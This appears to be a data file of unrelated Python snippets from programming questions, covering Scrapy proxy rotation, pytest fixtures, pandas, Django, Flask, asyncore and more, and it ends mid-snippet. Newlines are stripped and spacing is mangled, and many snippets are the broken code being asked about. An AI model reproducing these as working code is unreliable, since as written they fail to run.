"import scrapyimport randomimport requestsfrom itertools import cyclefrom bs4 import BeautifulSoupfrom scrapy.http.request import Requestfrom scrapy.crawler import CrawlerProcessclass ProxySpider ( scrapy.Spider ) : name = `` sslproxies '' check_url = `` https : //stackoverflow.com/questions/tagged/web-scraping '' proxy_link = `` https : //www.sslproxies.org/ '' def start_requests ( self ) : proxylist = self.get_proxies ( ) random.shuffle ( proxylist ) proxy_ip_port = next ( cycle ( proxylist ) ) print ( proxy_ip_port ) # Checking out the proxy address request = scrapy.Request ( self.check_url , callback=self.parse , errback=self.errback_httpbin , dont_filter=True ) request.meta [ 'proxy ' ] = `` http : // { } '' .format ( proxy_ip_port ) yield request def get_proxies ( self ) : response = requests.get ( self.proxy_link ) soup = BeautifulSoup ( response.text , '' lxml '' ) proxy = [ ' : '.join ( [ item.select_one ( `` td '' ) .text , item.select_one ( `` td : nth-of-type ( 2 ) '' ) .text ] ) for item in soup.select ( `` table.table tbody tr '' ) if `` yes '' in item.text ] return proxy def parse ( self , response ) : print ( response.meta.get ( `` proxy '' ) ) # Compare this to the earlier one whether they both are the same def errback_httpbin ( self , failure ) : print ( `` Failure : `` +str ( failure ) ) if __name__ == `` __main__ '' : c = CrawlerProcess ( { 'USER_AGENT ' : 'Mozilla/5.0 ' , 'DOWNLOAD_TIMEOUT ' : 5 , } ) c.crawl ( ProxySpider ) c.start ( )"
"import multiprocessing as mpc ... def Wrapper ( self , ... ) : jobs = [ ] q = mpc.Queue ( ) p1 = mpc.Process ( target=self.function1 , args= ( timestep , ) ) jobs.append ( p1 ) p2 = mpc.Process ( target=self.function2 , args= ( timestep , arg1 , arg2 , arg3 , ... , q ) ) jobs.append ( p2 ) for j in jobs : j.start ( ) result = q.get ( ) for j in jobs : j.join ( )"
"try : import simplejson as jsonexcept ImportError : try : import json except ImportError : try : from django.utils import simplejson as json except : raise `` Requires either simplejson , Python 2.6 or django.utils ! ''"
"def do_stuff ( ) : with open ( '/tmp/mylogs.txt ' , ' a ' ) as f : f.write ( str ( time.time ( ) ) ) f.write ( ' stuff done ! \n ' ) return 42 def test_doing_stuff ( watch_logs ) : assert do_stuff ( ) == 42 assert do_stuff ( ) == 43 @ pytest.fixture ( ) def watch_logs ( request ) : with open ( '/tmp/mylogs.txt ' ) as f : log_before = f.read ( ) def get_new_logs ( ) : with open ( '/tmp/mylogs.txt ' ) as f : log_after = f.read ( ) return log_after.replace ( log_before , `` ) return get_new_logs def test_doing_stuff ( watch_logs ) : assert do_stuff ( ) == 42 print ( watch_logs ( ) ) assert do_stuff ( ) == 43 print ( watch_logs ( ) ) @ pytest.fixture ( ) def watch_logs ( request ) : with open ( '/tmp/mylogs.txt ' ) as f : log_before = f.read ( ) def get_new_logs ( ) : with open ( '/tmp/mylogs.txt ' ) as f : log_after = f.read ( ) return log_after.replace ( log_before , `` ) def print_new_logs ( ) : print ( '~ ' * 20 + ' logs ' + '~ ' * 20 ) print ( get_new_logs ( ) ) print ( '~ ' * 50 ) request.addfinalizer ( print_new_logs ) return get_new_logs"
"> > > conditional = False > > > x = [ 1 if conditional else 2 , 3 , 4 ] [ 2 , 3 , 4 ] > > > conditional = False > > > x = [ 1 if conditional , 3 , 4 ] [ 3 , 4 ]"
"In [ 1 ] : math.log ? Type : builtin_function_or_methodBase Class : < type 'builtin_function_or_method ' > String Form : < built-in function log > Namespace : InteractiveDocstring : log ( x [ , base ] ) Return the logarithm of x to the given base . If the base not specified , returns the natural logarithm ( base e ) of x . In [ 1 ] : from gi.repository import GtkIn [ 2 ] : mylabel = Gtk.Label ( `` hello '' ) In [ 3 ] : mylabel.set_text ? Type : instancemethodBase Class : < type 'instancemethod ' > String Form : < bound method Label.set_text of < Label object at 0x275b230 ( GtkLabel at 0x28cd040 ) > > Namespace : InteractiveFile : /usr/lib/python2.7/dist-packages/gi/types.pyDefinition : L.set_text ( *args , **kwargs ) Docstring : < no docstring >"
class A : passrepr ( A ) = ' < class __main__.A at 0x6f570 > ' b=A ( ) repr ( b ) = ' < __main__.A instance at 0x74d78 > '
"import os , platformclass A ( object ) : @ staticmethod def getRoot ( ) : return ' C : \\ ' if platform.system ( ) == 'Windows ' else '/ ' pth = os.path.join ( A.getRoot ( ) , 'some ' , 'path ' )"
"import pandas as pddata = [ [ 'Alex in FL ' , 'ten ' ] , [ 'Bob in FLORIDA ' , 'five ' ] , [ 'Will in GA ' , 'three ' ] ] df = pd.DataFrame ( data , columns= [ 'Name ' , 'Age ' ] ) # Dataframe : Name Age0 Alex in FL ten1 Bob in FLORIDA five2 Will in GA three # Command that should autocomplete ( but does not ) : df.Name.str.matc [ +TAB ]"
"x = 0a = x * np.log ( x ) b = np.log ( np.power ( x , x ) ) print ( a , b ) for i in range ( -30,30,10 ) : x = 10 . **-i a = x * np.log ( x ) b = np.log ( np.power ( x , x ) ) print ( a , b ) nan 0.06.90775527898e+31 inf4.60517018599e+21 inf230258509299.0 inf0.0 0.0-2.30258509299e-09 -2.30258512522e-09-4.60517018599e-19 0.0"
"df=pd.DataFrame ( np.random.randint ( 0,10 , ( 6,6 ) ) ) df def css_border ( x , pos ) : return [ `` border-left : 1px solid red '' if i in pos else `` border : 0px '' for i , col in enumerate ( x ) ] def display_df_with_delimiter ( df , pos ) : return df.style.apply ( partial ( css_border , pos=pos ) , axis=1 ) display_df_with_delimiter ( df , [ 0,1,2,5 ] )"
"> > > kunSys [ -w0 + w1 - 8*x1 + 20 , -2*w0 + w2 - 8*x2 + 4 , w0* ( -x1 - 2*x2 + 2 ) , w1*x1 , w2*x2 , w0 > = 0 , w1 > = 0 , w2 > = 0 ] > > > lagVars ( x1 , x2 , w0 , w1 , w2 ) > > > solve ( kunSys , lagVars ) NotImplementedError : inequality has more than one symbol of interest > > > kunSys [ :5 ] [ -w0 + w1 - 8*x1 + 20 , -2*w0 + w2 - 8*x2 + 4 , w0* ( -x1 - 2*x2 + 2 ) , w1*x1 , w2*x2 ] > > > solve ( kunSys [ :5 ] , lagVars ) [ ( 0 , 0 , 0 , -20 , -4 ) , ( 0 , 1/2 , 0 , -20 , 0 ) , ( 0 , 1 , -2 , -22 , 0 ) , ( 2 , 0 , 4 , 0 , 4 ) , ( 11/5 , -1/10 , 12/5 , 0 , 0 ) , ( 5/2 , 0 , 0 , 0 , -4 ) , ( 5/2 , 1/2 , 0 , 0 , 0 ) ] > > > kunSys [ 5 : ] [ w0 > = 0 , w1 > = 0 , w2 > = 0 ] > > > solve ( kunSys [ 5 : ] , lagVars ) ( 0 < = w0 ) & ( 0 < = w1 ) & ( 0 < = w2 ) & ( w0 < oo ) & ( w1 < oo ) & ( w2 < oo )"
"my_string = 'text_with_ { var_1 } _to_variables_ { var_2 } 'my_string.format ( var_1='10 ' ) # # # make process 1my_string.format ( var_2='22 ' ) KeyError : 'var_2 ' name = 'Luis'ids = [ '12344 ' , '553454 ' , 'dadada ' ] def create_list ( name , ids ) : my_string = 'text_with_ { var_1 } _to_variables_ { var_2 } '.replace ( ' { var_1 } ' , name ) return [ my_string.replace ( ' { var_2 } ' , _id ) for _id in ids ] [ 'text_with_Luis_to_variables_12344 ' , 'text_with_Luis_to_variables_553454 ' , 'text_with_Luis_to_variables_dadada ' ]"
"def interrupted ( signum , stackframe ) : log.warning ( 'interrupted > Got signal : % s ' , signum ) menu.quitMenu = True # to stop my codesignal.signal ( signal.SIGINT , interrupted ) # Handle KeyboardInterrupt def askUser ( self ) : current_date = datetime.now ( ) .isoformat ( ' ' ) choice = raw_input ( ' % s > ' % current_date ) return choice from datetime import datetimeclass Menu : def __init__ ( self ) : self.quitMenu = False def showMenu ( self ) : print `` ' A ) Do AB ) Do B '' ' def askUser ( self ) : current_date = datetime.now ( ) .isoformat ( ' ' ) choice = raw_input ( ' % s > Please select option > ' % current_date ) print return choice def stopMe ( self ) : self.quitMenu = True def alive ( self ) : return self.quitMenu == False def doMenuOnce ( self ) : self.showMenu ( ) choice = self.askUser ( ) if not self.alive ( ) : # Maybe somebody has tried to stop the menu while in askUser return if choice == ' A ' : print ' A selected ' elif choice == ' B ' : print ' B selected ' else : print 'ERR : choice % s not supported ' % ( choice ) def forever ( self ) : while self.alive ( ) : self.doMenuOnce ( ) from twisted.internet import reactor , threadsimport signalclass MenuTwisted : def __init__ ( self , menu ) : self.menu = menu signal.signal ( signal.SIGINT , self.interrupted ) # Handle KeyboardInterrupt def interrupted ( self , signum , stackframe ) : print 'Interrupted ! ' self.menu.stopMe ( ) def doMenuOnce ( self ) : threads.deferToThread ( self.menu.doMenuOnce ) .addCallback ( self.forever ) def forever ( self , res=None ) : if self.menu.alive ( ) : reactor.callLater ( 0 , self.doMenuOnce ) else : reactor.callFromThread ( reactor.stop ) def run ( self ) : self.forever ( ) reactor.run ( ) menu = Menu ( ) menu.forever ( ) A ) Do AB ) Do B2013-12-03 11:00:26.288846 > Please select option > ^CTraceback ( most recent call last ) : File `` twisted_keyboard_interrupt.py '' , line 72 , in < module > menu.forever ( ) File `` twisted_keyboard_interrupt.py '' , line 43 , in forever self.doMenuOnce ( ) File `` twisted_keyboard_interrupt.py '' , line 34 , in doMenuOnce choice = self.askUser ( ) File `` twisted_keyboard_interrupt.py '' , line 22 , in askUser choice = raw_input ( ' % s > Please select option > ' % current_date ) KeyboardInterrupt menu = Menu ( ) menutw = MenuTwisted ( menu ) menutw.run ( ) A ) Do AB ) Do B2013-12-03 11:04:18.678219 > Please select option > ^CInterrupted !"
"import asyncioimport concurrent.futuresdef blocking_io ( ) : # File operations ( such as logging ) can block the # event loop : run them in a thread pool . with open ( '/dev/urandom ' , 'rb ' ) as f : return f.read ( 100 ) async def main ( ) : loop = asyncio.get_running_loop ( ) # 2 . Run in a custom thread pool : with concurrent.futures.ThreadPoolExecutor ( ) as pool : result = await loop.run_in_executor ( pool , blocking_io ) print ( 'custom thread pool ' , result ) asyncio.run ( main ( ) )"
"from apscheduler.schedulers.blocking import BlockingSchedulerdef job ( ) : print `` Decorated job '' scheduler = BlockingScheduler ( ) scheduler.add_job ( job , 'interval ' , minutes=5 ) scheduler.start ( ) scheduler = BlockingScheduler ( ) scheduler.add_job ( job , 'interval ' , minutes=5 , id='my_job_id ' ) # iterationCount ? ? if ( iterationCount = 100 ) : scheduler.remove_job ( 'my_job_id ' ) exit ( 0 ) scheduler.start ( )"
"@ pytest.fixture ( scope= '' function '' , autouse=True ) @ pytest.mark.usefixturesdef pause_on_assert ( ) : yield if hasattr ( sys , 'last_value ' ) and isinstance ( sys.last_value , AssertionError ) : tkinter.messagebox.showinfo ( sys.last_value ) @ pytest.fixture ( scope= '' function '' , autouse=True ) def _wrapper : print ( `` pre condition '' ) yield print ( `` post condition '' ) def test_abc ( ) : assert 1==0"
"import pyodbcparams = { 'autocommit ' : True , 'uid ' : 'myuser ' , 'tds_version ' : ' 8.0 ' , 'DRIVER ' : ' { mssql } ' , 'pwd ' : 'mypassword ' , 'server ' : 'sql-server-01 ' , 'database ' : 'mydb ' , 'port ' : 1433 , } c1 = pyodbc.connect ( **params ) c2 = pyodbc.connect ( **params )"
"class Square ( object ) : `` '' '' A square with two properties : a writable area and a read-only perimeter . To use : > > > sq = Square ( 3 ) > > > sq.area 9 > > > sq.perimeter 12 > > > sq.area = 16 > > > sq.side 4 > > > sq.perimeter 16 `` '' '' def __init__ ( self , side ) : self.side = side def __get_area ( self ) : `` '' '' Calculates the 'area ' property . '' '' '' return self.side ** 2 def ___get_area ( self ) : `` '' '' Indirect accessor for 'area ' property . '' '' '' return self.__get_area ( ) def __set_area ( self , area ) : `` '' '' Sets the 'area ' property . '' '' '' self.side = math.sqrt ( area ) def ___set_area ( self , area ) : `` '' '' Indirect setter for 'area ' property . '' '' '' self.__set_area ( area ) area = property ( ___get_area , ___set_area , doc= '' '' '' Gets or sets the area of the square . '' '' '' ) @ property def perimeter ( self ) : return self.side * 4 @ propertydef area ( self ) : return self.side ** 2 @ area.setterdef area ( self , value ) : self.side = math.sqrt ( value )"
"cython -D mmod.py from distutils.core import setupfrom distutils.extension import Extensionfrom Cython.Distutils import build_extext_modules = [ Extension ( `` mmod '' , [ `` mmod.py '' ] ) ] setup ( cmdclass = { 'build_ext ' : build_ext } , ext_modules = ext_modules )"
@ contextmanagerdef AutoClose ( obj ) : try : yield obj finally : obj.Close ( )
export PYTHONPATH=/usr/lib/python2.6 : ~/Projects/mypython import sysprint sys.path
"ids = 12 fields = name ids = 12 , 13 , 14 fields = name , title import pyparsing as Pkey = P.oneOf ( `` ids fields '' ) equal = P.Literal ( '= ' ) key_equal = key + equalval = ~key_equal + P.Word ( P.alphanums+ ' , ' ) gr = P.Group ( key_equal+val ) print gr.parseString ( `` ids = 12 fields = name '' )"
"from django.db import modelsfrom django.core.exceptions import ValidationErrorclass Foo ( models.Model ) : name = models.CharField ( `` Name '' , blank=True , max_length=300 ) class Bar ( models.Model ) : name = models.CharField ( `` Name '' , blank=True , max_length=300 ) foo = models.ForeignKey ( 'Foo ' , verbose_name='Foo ' ) def clean ( self ) : if self.name + self.foo.name ! = 'FooBar ' : raise ValidationError ( 'Concatenation should be FooBar . ' ) from django.contrib import adminimport modelsclass BarInline ( admin.TabularInline ) : model = models.Barclass FooAdmin ( admin.ModelAdmin ) : model = models.Foo inlines = [ BarInline , ] site = admin.sitesite.register ( models.Foo , FooAdmin )"
for a in range ( 95 ) : for b in range ( 95 ) : for c in range ( 95 ) : for d in range ( 95 ) : ... do some computings ... if condition : task completed
"con = sqlite3.connect ( 'backup.db ' ) con.row_factory = sqlite3.Rowcur = con.cursor ( ) cur.execute ( 'select * from tb1 ; ' ) for row in cur : try : # row = dataCur.fetchone ( ) # if row == None : break print type ( row ) print ' Starting on : % i ' % row [ 0 ] cleaner = Cleaner ( scripts=True , remove_tags= [ 'img ' ] , embedded=True ) try : cleaned = cleaner.clean_html ( row [ 2 ] ) # data stored in second col cur.execute ( 'update tb1 set data = ? where id = ? ; ' , ( cleaned , row [ 0 ] ) ) except AttributeError : print 'Attribute error ' print ' Ended on : % i ' % row [ 0 ] except IOError : print 'IOexception '"
"import django_tables2 as tablesfrom .models import Accountfrom django_tables2.utils import A # alias for Accessorclass AccountTable ( tables.Table ) : nickname = tables.LinkColumn ( 'accounts : detail ' , args= [ A ( 'pk ' ) ] ) class Meta : model = Account attrs = { 'class ' : 'table table-striped table-hover ' } exclude = ( `` created '' , `` modified '' , `` destination '' ) class DetailView ( SingleTableMixin , generic.DetailView ) : template_name = 'accounts/account_detail.html ' context_table_name = 'table ' model = Account table_class = AccountTable context_object_name = object @ method_decorator ( login_required ) def dispatch ( self , *args , **kwargs ) : return super ( DetailView , self ) .dispatch ( *args , **kwargs ) def get_context_data ( self , **kwargs ) : context = super ( DetailView , self ) .get_context_data ( object=self.object ) context [ 'title ' ] = 'Account Detail ' context [ 'pk ' ] = self.kwargs.get ( self.pk_url_kwarg , None ) return context < ! DOCTYPE html > { % extends `` accounts/base.html '' % } { % load django_tables2 % } { % load render_table from django_tables2 % } < title > Account Detail < /title > { % block content % } < br > < br > < h1 > { { object.id } } : { { object.nickname } } < /h1 > < div > { % render_table table % } < /div > { % endblock % }"
self.response.headers [ 'Cache-Control ' ] = `` public ''
"from google.appengine.ext import webappimport wsgiref.handlersclass MainHandler ( webapp.RequestHandler ) : def get ( self ) : self.response.out.write ( 'Home Page ' ) paths = [ ( '/ ' , MainHandler ) ] application = webapp.WSGIApplication ( paths , debug=True ) def main ( ) : wsgiref.handlers.CGIHandler ( ) .run ( application ) if __name__ == '__main__ ' : main ( ) from StringIO import StringIOfrom main import MainHandlerimport unittestfrom google.appengine.ext import webappclass MyTestCase ( unittest.TestCase ) : def test_get ( self ) : request = webapp.Request ( { `` wsgi.input '' : StringIO ( ) , `` CONTENT_LENGTH '' : 0 , `` METHOD '' : `` GET '' , `` PATH_INFO '' : `` / '' , } ) response = webapp.Response ( ) handler = MainHandler ( ) handler.initialize ( request , response ) handler.get ( ) self.assertEqual ( response.out.getvalue ( ) , `` Home Page '' )"
"> > > re.search ( ' ( ? P < b > .b. ) .* ( ? P < i > .i . ) ' , 'abcdefghijk ' ) .groupdict ( ) { ' i ' : 'hij ' , ' b ' : 'abc ' } > > > re.search ( ' ( ? P < b > .b. ) | ( ? P < i > .i . ) ' , unknown_order_alphabet_str ) .groupdict ( ) { ' i ' : 'hij ' , ' b ' : 'abc ' }"
"dict_ = { 'foo ' : 1 , 'bar ' : 2 } copy1 = dict ( dict_ ) copy2 = dict_.copy ( )"
"def find_stuff ( visitor ) : # library search function for x in ( 1 , 2 , 3 , 4 , 5 , 6 ) : visitor ( x ) def my_visitor ( x ) : # client visitor functions ( also often use lambdas ) if x > 3 : yield x / 2 # > > > WANT TO DO SOMETHING LIKE THIS < < < # results = find_stuff ( my_visitor ) # client usage def print_repr_visitor ( x ) : print repr ( x ) find_stuff ( print_repr_visitor ) # alternative usage def find_stuff ( visitor ) : for x in ( 1 , 2 , 3 , 4 , 5 ) : val = visitor ( x ) if val is not None : yield val def find_stuff ( visitor ) : for x in ( 1 , 2 , 3 , 4 , 5 ) : val = visitor ( x ) if val == 'yield ' : yield x elif val is not None : yield val"
"headshape = ( 512,512,245 ) # The shape the image should beheaddata = np.fromfile ( `` Analyze_CT_Head.img '' , dtype=np.int16 ) # loads the image as a flat array , 64225280 long . For testing , a large array of random numbers would dohead_shaped = np.zeros ( shape=headshape ) # Array to hold the reshaped data # This set of loops is the problemfor ux in range ( 0 , headshape [ 0 ] ) : for uy in range ( 0 , headshape [ 1 ] ) : for uz in range ( 0 , headshape [ 2 ] ) : head_shaped [ ux ] [ uy ] [ uz ] = headdata [ ux + headshape [ 0 ] *uy + ( headshape [ 0 ] *headshape [ 1 ] ) *uz ] # Note the weird indexing of the flat array - this is the pixel ordering I have to work with"
"from flask import Flaskfrom flask_sqlalchemy import SQLAlchemyimport flask_adminfrom flask_admin.contrib import sqlaapp = Flask ( __name__ ) db = SQLAlchemy ( ) admin = flask_admin.Admin ( name='Test ' ) class Users ( db.Model ) : `` '' '' Contains users of the database `` '' '' user_id = db.Column ( db.Integer , primary_key=True ) username = db.Column ( db.String ( 64 ) , index=True , unique=True , nullable=False ) def __str__ ( self ) : return self.usernameclass Posts ( db.Model ) : `` '' '' Contains users of the database `` '' '' post_id = db.Column ( db.Integer , primary_key=True ) username = db.Column ( db.String ( 11 ) , db.ForeignKey ( Users.username ) , nullable=False ) post = db.Column ( db.String ( 256 ) ) user = db.relation ( Users , backref='user ' ) def build_sample_db ( ) : db.drop_all ( ) db.create_all ( ) data = { 'user1 ' : 'post1 ' , 'user1 ' : 'post2 ' , 'user2 ' : 'post1 ' } for user , post in data.items ( ) : u = Users ( username=user ) p = Posts ( username=user , post=post ) db.session.add ( u ) db.session.add ( p ) db.session.commit ( ) class MyModelView ( sqla.ModelView ) : passif __name__ == '__main__ ' : app.config [ 'SECRET_KEY ' ] = '123456790 ' app.config [ 'DATABASE_FILE ' ] = 'sample_db.sqlite ' app.config [ 'SQLALCHEMY_DATABASE_URI ' ] = 'sqlite : ///database ' app.config [ 'SQLALCHEMY_ECHO ' ] = True db.init_app ( app ) admin.init_app ( app ) admin.add_view ( MyModelView ( Posts , db.session ) ) with app.app_context ( ) : build_sample_db ( ) # Start app app.run ( debug=True )"
"rhythmbox -D rate execfile ( '/path/to/rate.py ' ) # rhythmbox -D rate # Rhythmbox : Edit > Plugins > Python Console enabled # Play a song # Open Rhythmbox Python Console # execfile ( '/path/to/rate.py ' ) import sysimport rbfrom gi.repository import Gtk , Gdkdef rateThread ( rating ) : try : currentSongURI = shell.props.shell_player.get_playing_entry ( ) .get_playback_uri ( ) print `` Setting rating for `` + currentSongURI from gi.repository import GLib , Gio bus_type = Gio.BusType.SESSION flags = 0 iface_info = None print `` Get Proxy '' proxy = Gio.DBusProxy.new_for_bus_sync ( bus_type , flags , iface_info , `` org.gnome.Rhythmbox3 '' , `` /org/gnome/Rhythmbox3/RhythmDB '' , `` org.gnome.Rhythmbox3.RhythmDB '' , None ) print `` Got proxy '' rating = float ( rating ) vrating = GLib.Variant ( `` d '' , rating ) print `` SetEntryProperties '' proxy.SetEntryProperties ( `` ( sa { sv } ) '' , currentSongURI , { `` rating '' : vrating } ) print `` Done '' except : print sys.exc_info ( ) return Falsedef rate ( ) : if shell.props.shell_player.get_playing_entry ( ) : Gdk.threads_add_idle ( 100 , rateThread , 3 ) rate ( ) Desktop/test2.py:41 : ( < class 'gi._glib.GError ' > , GError ( 'Timeout was reached ' , ) , < traceback object at 0x913e554 > )"
"import operatorlista= [ `` a '' , '' b '' , '' c '' , '' d '' , '' e '' , '' f '' ] print operator.itemgetter ( 1,3,5 ) ( lista ) > > ( ' b ' , 'd ' , ' f ' ) columns=1,3,5print operator.itemgetter ( columns ) ( lista ) > > TypeError : list indices must be integers , not tuple"
def foo ( a= [ ] ) : a.append ( 3 ) return a
"def get_permutation ( l , i ) : return list ( itertools.permutations ( l ) ) [ i ]"
STATICFILES_STORAGE= 'pms.s3utils.StaticRootS3BotoStorage '
"class MyException ( Exception ) : passdef gen ( ) : for i in range ( 3 ) : try : yield i except MyException : print 'handled exception'for i in gen ( ) : print i raise MyException $ python x.py0Traceback ( most recent call last ) : File `` x.py '' , line 14 , in < module > raise MyException__main__.MyException $ python x.py0handled exception1handled exception2handled exception def gen ( ) : for i in range ( 3 ) : try : yield i except MyException : print 'handled exception ' yieldimport sysg = gen ( ) for i in g : try : print i raise MyException except : g.throw ( *sys.exc_info ( ) )"
# -*- coding : utf-8 -*-def test ( ) : assert `` тест '' == `` тест1 '' def test ( ) : > assert `` тест '' == `` тест1 '' E assert '\xd1\x82\xd0 ... 1\x81\xd1\x82 ' == '\xd1\x82\xd0\ ... \x81\xd1\x821 ' E - тестE + тест1E ? +test.py:3 : AssertionError
import cx_OracleImportError : libaio.so.1 : can not open shared object file : No such file or directory $ apt-get install libaio1 libaio-dev github.com/heroku/heroku-buildpack-apt github.com/Maethorin/oracle-heroku-buildpackgithub.com/Maethorin/heroku-buildpack-python $ heroku config : set ORACLE_HOME=/app/vendor/oracle_instantclient/instantclient_11_2 $ heroku config : set LD_LIBRARY_PATH=/app/.apt/usr/lib/x86_64-linux-gnu : /app/vendor/oracle_instantclient/instantclient_11_2 : /app/vendor/oracle_instantclient/instantclient_11_2/sdk : /lib/x86_64-linux-gnu : /usr/lib/x86_64-linux-gnu : /usr/lib : /lib $ heroku config : set LIBRARY_PATH=/app/.apt/usr/lib/x86_64-linux-gnu : /app/vendor/oracle_instantclient/instantclient_11_2 : /app/vendor/oracle_instantclient/instantclient_11_2/sdk : /lib/x86_64-linux-gnu : /usr/lib/x86_64-linux-gnu : /usr/lib : /lib $ heroku config : set INCLUDE_PATH=/app/.apt/usr/include $ heroku config : set PATH=/bin : /sbin : /usr/bin : /app/.apt/usr/bin $ heroku config : set PKG_CONFIG_PATH=/app/.apt/usr/lib/x86_64-linux-gnu/pkgconfig $ heroku config : set CPPPATH=/app/.apt/usr/include $ heroku config : set CPATH=/app/.apt/usr/include drwx -- -- -- 3 u32473 dyno 4096 Dec 21 2013 .drwx -- -- -- 3 u32473 dyno 4096 Dec 21 2013 ..-rw -- -- -- - 1 u32473 dyno 16160 May 9 2013 libaio.alrwxrwxrwx 1 u32473 dyno 37 May 9 2013 libaio.so - > /lib/x86_64-linux-gnu/libaio.so.1.0.1drwx -- -- -- 2 u32473 dyno 4096 May 17 16:57 pkgconfig
"# df [ df [ 'ID ' ] =='12345 ' ] [ [ 'address ' , 'zip ] ] .valuesaddresses = [ [ 'PULMONARY MED ASSOC MED GROUP INC 1485 RIVER PARK DR STE 200 ' , '95815 ' ] , [ '1485 RIVER PARK DRIVE SUITE 200 ' , '95815 ' ] , [ '1485 RIVER PARK DR SUITE 200 ' , '95815 ' ] , [ '3637 MISSION AVE SUITE 7 ' , '95608 ' ] ] def calcDistance ( a1 , a2 , z1 , z2 , parser ) : z1 = str ( z1 ) z2 = str ( z2 ) add1 = parser.parse ( a1 ) add2 = parser.parse ( a2 ) zip_dist = 0 if z1 == z2 else distance.levenshtein ( z1 , z2 ) zip_weight = .4 attn_dist = distance.levenshtein ( add1 [ 'attn ' ] , add2 [ 'attn ' ] ) if add1 [ 'attn ' ] and add2 [ 'attn ' ] else 0 attn_weight = .1 if add1 [ 'attn ' ] and add2 [ 'attn ' ] else 0 suite_dist = distance.levenshtein ( add1 [ 'suite_num ' ] , add2 [ 'suite_num ' ] ) if add1 [ 'suite_num ' ] and add2 [ 'suite_num ' ] else 0 suite_weight = .1 if add1 [ 'suite_num ' ] and add2 [ 'suite_num ' ] else 0 street_dist = distance.levenshtein ( add1 [ 'street_name ' ] , add2 [ 'street_name ' ] ) if add1 [ 'street_name ' ] and add2 [ 'street_name ' ] else 0 street_weight = .3 if add1 [ 'street_name ' ] and add2 [ 'street_name ' ] else 0 house_dist = distance.levenshtein ( add1 [ 'house ' ] , add2 [ 'house ' ] ) if add1 [ 'house ' ] and add2 [ 'house ' ] else 0 house_weight = .1 if add1 [ 'house ' ] and add2 [ 'house ' ] else 0 weight = ( zip_dist * zip_weight + attn_dist * attn_weight + suite_dist * suite_weight + street_dist * street_weight + house_dist * house_weight ) / ( zip_weight +attn_weight + suite_weight + street_weight + house_weight ) return weight similarity = -1*np.array ( [ [ calcDistance ( a1 [ 0 ] , a2 [ 0 ] , a1 [ 1 ] , a2 [ 1 ] , addr_parser ) for a1 in addresses ] for a2 in addresses ] ) print similarity array ( [ [ -0. , -0. , -0. , -5.11111111 ] , [ -0. , -0. , -0. , -5.11111111 ] , [ -0. , -0. , -0. , -5.11111111 ] , [ -5.11111111 , -5.11111111 , -5.11111111 , -0 . ] ] ) affprop = sklearn.cluster.AffinityPropagation ( affinity= '' precomputed '' , damping=.5 ) affprop.fit ( similarity ) print affprop.labels_array ( [ 0 , 0 , 1 , 2 ] , dtype=int64 ) dbscan = sklearn.cluster.DBSCAN ( min_samples=1 ) dbscan.fit ( similarity ) print dbscan.labels_array ( [ 0 , 0 , 0 , 1 ] , dtype=int64 )"
"df = pd.DataFrame ( { 'Person ' : 1,1,1,1,1,2,2,2,2,2 ] , 'Date ' : ' 1/1/2015 ' , ' 2/1/2015 ' , ' 3/1/2015 ' , ' 4/1/2015 ' , ' 5/1/2015 ' , ' 6/1/2011 ' , ' 7/1/2011 ' , ' 8/1/2011 ' , ' 9/1/2011 ' , '10/1/2011 ' ] , 'MonthNo ' : [ 1,2,3,4,5,1,2,3,4,5 ] , 'Weight ' : [ 100,110,115,112,108,205,210,211,215,206 ] } ) Date MonthNo Person Weight0 1/1/2015 1 1 1001 2/1/2015 2 1 1102 3/1/2015 3 1 1153 4/1/2015 4 1 1124 5/1/2015 5 1 1085 6/1/2011 1 2 2056 7/1/2011 2 2 2107 8/1/2011 3 2 2118 9/1/2011 4 2 2159 10/1/2011 5 2 206 Date MonthNo Person Weight0 1/1/2015 1 1 1001 2/1/2015 2 1 1102 3/1/2015 3 1 1155 6/1/2011 1 2 2056 7/1/2011 2 2 2107 8/1/2011 3 2 2118 9/1/2011 4 2 215"
"www.gmail.com : recv http code : 301www.yandex.ru : recv http code : 200www.python.org : recv http code : 200www.google.ru : recv http code : 200www.gravatar.com : recv http code : 302www.com.com : recv http code : 302www.yahoo.com : recv http code : 302www.bom.com : recv http code : 301 # c = AsyncHTTP ( 'http : //www.no-such-host.ru ' ) # ! this line breaks execution ! connection error : [ Errno -5 ] No address associated with hostnamewww.gmail.com : recv http code : 301www.yandex.ru : recv http code : 200www.yahoo.com : recv http code : 302www.com.com : recv http code : 302www.bom.com : recv http code : 301www.gravatar.com : recv http code : 302 # coding=utf-8import asyncoreimport string , socketimport StringIOimport mimetools , urlparseclass AsyncHTTP ( asyncore.dispatcher ) : # HTTP requestor def __init__ ( self , uri ) : asyncore.dispatcher.__init__ ( self ) self.uri = uri # turn the uri into a valid request scheme , host , path , params , query , fragment = urlparse.urlparse ( uri ) assert scheme == `` http '' , `` only supports HTTP requests '' try : host , port = string.split ( host , `` : '' , 1 ) port = int ( port ) except ( TypeError , ValueError ) : port = 80 # default port if not path : path = `` / '' if params : path = path + `` ; '' + params if query : path = path + `` ? '' + query self.request = `` GET % s HTTP/1.0\r\nHost : % s\r\n\r\n '' % ( path , host ) self.host = host self.port = port self.status = None self.header = None self.http_code = None self.data = `` '' # get things going ! self.create_socket ( socket.AF_INET , socket.SOCK_STREAM ) # self.connect ( ( host , port ) ) # return try : self.connect ( ( host , port ) ) except Exception , e : self.close ( ) self.handle_connect_expt ( e ) def handle_connect ( self ) : self.send ( self.request ) def handle_expt ( self ) : print `` handle_expt error ! '' self.close ( ) def handle_error ( self ) : print `` handle_error error ! '' self.close ( ) def handle_connect_expt ( self , expt ) : print `` connection error : '' , expt def handle_code ( self ) : print self.host , '' : `` , '' recv http code : `` , self.http_code def handle_read ( self ) : data = self.recv ( 2048 ) # print data if not self.header : self.data = self.data + data try : i = string.index ( self.data , `` \r\n\r\n '' ) except ValueError : return # continue else : # parse header fp = StringIO.StringIO ( self.data [ : i+4 ] ) # status line is `` HTTP/version status message '' status = fp.readline ( ) self.status = string.split ( status , `` `` , 2 ) self.http_code = self.status [ 1 ] self.handle_code ( ) # followed by a rfc822-style message header self.header = mimetools.Message ( fp ) # followed by a newline , and the payload ( if any ) data = self.data [ i+4 : ] self.data = `` '' # header recived # self.close ( ) def handle_close ( self ) : self.close ( ) c = AsyncHTTP ( 'http : //www.python.org ' ) c = AsyncHTTP ( 'http : //www.yandex.ru ' ) c = AsyncHTTP ( 'http : //www.google.ru ' ) c = AsyncHTTP ( 'http : //www.gmail.com ' ) c = AsyncHTTP ( 'http : //www.gravatar.com ' ) c = AsyncHTTP ( 'http : //www.yahoo.com ' ) c = AsyncHTTP ( 'http : 